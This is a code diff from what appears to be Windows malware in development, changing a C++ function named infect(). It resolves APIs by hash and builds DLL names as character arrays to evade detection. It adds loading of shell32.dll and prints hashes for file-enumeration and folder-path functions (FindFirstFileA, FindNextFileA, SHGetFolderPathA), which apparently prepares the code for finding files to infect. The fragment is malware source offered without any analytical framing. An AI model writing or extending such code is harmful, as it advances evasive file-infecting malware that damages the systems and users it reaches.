@@ -127,9 +127,12 @@ void infect(void)
 
    LoadLibraryAHeader loadLibrary = reinterpret_cast<LoadLibraryAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x53b2070f));
    char msvcrtDll[] = {'m','s','v','c','r','t','.','d','l','l',0};
+   char shell32Dll[] = {'s','h','e','l','l','3','2','.','d','l','l',0};
    PIMAGE_DOS_HEADER msvcrtModule = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(msvcrtDll));
+   PIMAGE_DOS_HEADER shell32Module = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(shell32Dll));
 
    std::wcout << "msvcrt: " << std::hex << (std::uintptr_t)msvcrtModule << std::endl;
+   std::wcout << "shell32: " << std::hex << (std::uintptr_t)shell32Module << std::endl;
    std::wcout << "malloc: " << std::hex << fnv321a("malloc") << std::endl;
    std::wcout << "realloc: " << std::hex << fnv321a("realloc") << std::endl;
    std::wcout << "free: " << std::hex << fnv321a("free") << std::endl;
@@ -137,6 +140,7 @@ void infect(void)
    std::wcout << "strlen: " << std::hex << fnv321a("strlen") << std::endl;
    std::wcout << "FindFirstFileA: " << std::hex << fnv321a("FindFirstFileA") << std::endl;
    std::wcout << "FindNextFileA: " << std::hex << fnv321a("FindNextFileA") << std::endl;
+   std::wcout << "SHGetFolderPathA: " << std::hex << fnv321a("SHGetFolderPathA") << std::endl;
 }
 
 int wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
